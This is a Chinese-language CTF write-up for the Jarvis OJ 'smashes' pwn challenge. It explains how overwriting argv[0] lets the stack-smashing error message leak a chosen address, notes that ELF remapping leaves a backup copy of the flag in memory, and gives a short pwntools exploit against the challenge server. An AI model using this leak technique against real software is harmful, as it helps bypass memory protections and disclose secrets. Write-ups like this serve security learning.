---
title: 'jarvis:smashes'
date: 2018-11-28 13:59:27
tags:
---
自己看了半天还真做不来...
两个有趣的知识点
<!--more-->

# 附件
[附件][1]
# SSP Leak
虽然是绕不过了canary但是我们可以利用__stack_chk_fail在程序结束之前输出一些东西

我们先来看看__stack_chk_fail
```c
__stack_chk_fail (void)
{
  __fortify_fail_abort (false, "stack smashing detected");
}
```
跟进__fortify_fail_abort
```c
__fortify_fail_abort (_Bool need_backtrace, const char *msg)
{
  /* The loop is added only to keep gcc happy.  Don't pass down
     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]
     may point to the corrupted stack.  */
  while (1)
    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,
                    "*** %s ***: %s terminated\n",
                    msg,
                    (need_backtrace && __libc_argv[0] != NULL
                     ? __libc_argv[0] : "<unknown>"));
}
```

这里的__libc_argv[0]也就是程序名字在程序一开始的时候被设置在栈上
经过进一步研究发现他的地址也在栈上所以我们如果可以有可以覆盖到足够长的地方我们就可以用我们想泄露的地址覆盖原本的地址
那么就会在触发__stack_chk_fail同时泄露.

# ELF的重映射
有时候我们会发现memsearch的时候会有好几个备份
那可能就是elf文件内容被重映射
ELF重映射：当可执行文件足够小时，在不同的区段可能被多次映射。
使用memsearch(peda内)就可以找到备份地址

# 思路
* 这题主要是两次输入
* 第一次输入存在溢出但是我们没法获得canary，可以通过SSP LEAK来泄露
* 因为第二次我们必定会污染真正flag所以该地址处flag无法使用..通过调试我们发现了备份地址所以可以泄露备份

# exp
```python
from pwn import *
p=process("smashes")
p=remote("pwn.jarvisoj.com",9877)
p.readuntil("name? ")
payload="A".ljust(536,'\x00')+p64(0x400d20)
p.sendline(payload)
payload=''
p.sendlineafter("flag: ",payload)

p.interactive()
```




[1]:https://github.com/n132/Watermalon/tree/master/jarvis/Smashes
